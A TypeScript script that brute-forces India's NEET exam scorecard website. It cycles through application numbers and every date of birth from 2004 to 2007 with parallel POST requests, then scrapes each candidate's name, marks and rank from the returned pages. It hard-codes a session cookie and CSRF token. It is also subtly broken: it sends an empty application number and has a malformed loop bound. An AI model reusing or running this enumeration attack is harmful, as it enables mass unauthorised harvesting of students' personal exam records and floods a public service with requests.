import axios from 'axios';
import qs, { parse } from 'qs';
import Cheerio from 'cheerio';

async function bruteForceRequest(applicationNumber: string, day: string, month: string, year: string) {
    let data = qs.stringify({
        '_csrf-frontend': 'QK_cZ-IfRpPrhpts7gWFeM5B3LTrW0p94i6adE2CkR1z37QU0mYK_qPQyiKffNcMrTKT4YlvLRW2FvwhN8eoLg==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'advanced-frontend=pifc229ap30vijk196uf0npdsq; _csrf-frontend=766beeb5824b943c00e7de0ced460b10e6c9ae203c6baf9fa7e855610d64491ea%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%223phs0yLmHVQNqyRtcsOUb4ghT8fUzE93%22%3B%7D',
            'Origin': 'null',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Referer': '',
            'accept': 'text/css,*/*;q=0.1',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0',
            'sec-fetch-dest': 'style',
            'sec-fetch-mode': 'no-cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'x-client-data': 'CIy2yQEIprbJAQipncoBCKHhygEIlqHLAQiFoM0BCMiKzgEY7NPNAQ=='
        },
        data: data
    };

    try {

        // needs to parse HTML data 
        const response = await axios.request(config);
        const parsedData = parseHtml(JSON.stringify(response.data));
        if (parsedData) {
            console.log(parsedData.marks);
            console.log(parsedData.allIndiaRank);
        }

        return parsedData;
    } catch (e) {
        console.log(e);
        console.log("Server down!");
        return null;

    }
}

function parseHtml(htmlContent: string) {
    const $ = Cheerio.load(htmlContent);

    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';

    const candidateName = $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';

    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';

    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';

    if (allIndiaRank === 'N/A') {
        return null;
    }

    return {
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    }
}

// now bruteforce the logic using loops
// starts using rollnumber
// can be improved 
/*
async function main(rollnumber: string) {

    for (let year = 2007; year >= 2004; year--) {
        for (let month = 1; month <= 12; month++) {
            console.log(`processing data for rollNumber ${rollnumber} for ${year}-${month}`);
            for (let day = 1; day <= 31; day++) {
                const data = await bruteForceRequest("", day.toString(), month.toString(), year.toString());
                if (data) {
                    console.log(data);
                    process.exit(1);
                }
            }
        }
    }
}
in this code type of data is  actual data cause await is used here
if i remove await then it's type will be promise as bruteforcerequest function is async function
+

*/


async function main(rollnumber: string) {

    let solve = false;
    for (let year = 2007; year >= 2004; year--) {
        if (solve) { break; }
        for (let month = 1; month <= 12; month++) {

            if (solve) { break; }

            const dataPromises = [];
            console.log(`processing data for rollNumber ${rollnumber} for ${year}-${month}`);
            for (let day = 1; day <= 31; day++) {
                const data = bruteForceRequest("", day.toString(), month.toString(), year.toString());
                dataPromises.push(data);
            }

            // now wait for all 30 req.
            const data = await Promise.all(dataPromises);
            data.forEach(element => {

                if (element) {
                    console.log(element);
                    // process.exit(1);
                    solve = true;
                }
            });
        }

    }
}

// now creating loop for application
async function bruteForceAllApplication() {
    for (let applicationNumber = 240411000000; applicationNumber <= 2404119999999; applicationNumber++) {
        await main(applicationNumber.toString());
    }
}


bruteForceAllApplication();
